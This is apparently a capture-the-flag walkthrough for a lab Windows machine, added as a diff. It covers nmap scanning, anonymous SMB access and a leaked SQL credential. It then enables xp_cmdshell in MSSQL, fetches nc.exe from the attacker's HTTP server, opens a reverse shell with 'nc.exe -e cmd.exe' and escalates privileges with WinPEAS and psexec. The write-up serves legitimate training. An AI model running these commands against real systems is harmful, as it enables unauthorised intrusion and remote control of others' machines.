@@ -1,0 +1,68 @@
+It focuses on Windows shell privilege escalation, smbclient, mssql, and Linux commands.
+
+Step 1 Scanning: nmap -sC -sV -A [Target_IP]
+
+netBios-ssn (samba) on 139 (smbserver)
+MsSql on 1433
+
+Link to SMB: smbclient -N -L \\\\[Target_IP]\\
+focus on No $ end of filename (password free)
+
+Link to backups : smbclient -N \\\\[Target_IP]\\bckups
+smb: \> ls (to list all file in backups)
+smb: \> get [target_file] (download the file)
+
+read the file can find User & Password
+User : Archetype/sql_svc
+Password : M3g4c0rp123
+
+Step 2 Login MsSql server with the User & Password.
+use impacket.git tool
+link command: python3 /pwd/impacket/examples/mssqlclient.py Archetype/sql_svc@[Target_ip] -windows-auth
+
+After login success:
+
+sql>help (to see what operation you can do)
+sql>enable xp_cmdshell (let sql can use cmdshell)
+
+enable xp_cmdshell  is equal to use the four command
+{
+EXECUTE sp_configure 'show advanced options',1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+}
+
+than you can use "xp_cmdshell" to do with cmd command.
+
+Step 3 Stable shell (to reverse-shell)
+first we follow the method: xp_cmdshell with nc
+use the nc.exe tool on github
+
+than we set up python server on our machine (in order to send the file to target system)
+command : python3 -m http.server 
+// Keep in mind to run the server in the folder your nc.exe file is present
+// not dir nc.exe !! 
+
+than go back to the mssql (target system), and use the download command:
+xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+
+if we successfully download the file we will get the information in our server instance
+[target_ip] -- [Operation Time] "GET /nc.exe HTTP/1.1" 200 --
+
+than we can use nc to get the connection to the target_system
+command: nc -lvnp 4444
+flag meaning: l --listen mode, v --verbose, n --numeric-only IP address(no DNS), p --port, e --execute
+
+than go back to target system use the command:
+xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe [Your_tun0_IP] 4444"
+
+Step 4 Finding Our Flags and Privilege Escalation
+
+we can use a tool to auto find the weak points in the system "Winpeas"
+and use the same method to download the tool and send the tool by python server.
+
+and Last we can reconnect the target with the psexec.py in impacket/example/psexe.py
+command : python3 /pwd/impacket/examples/psexec.py [username]@[target_IP]
+
+and we will login the system with higher privilege. Surf the file and find the target flag
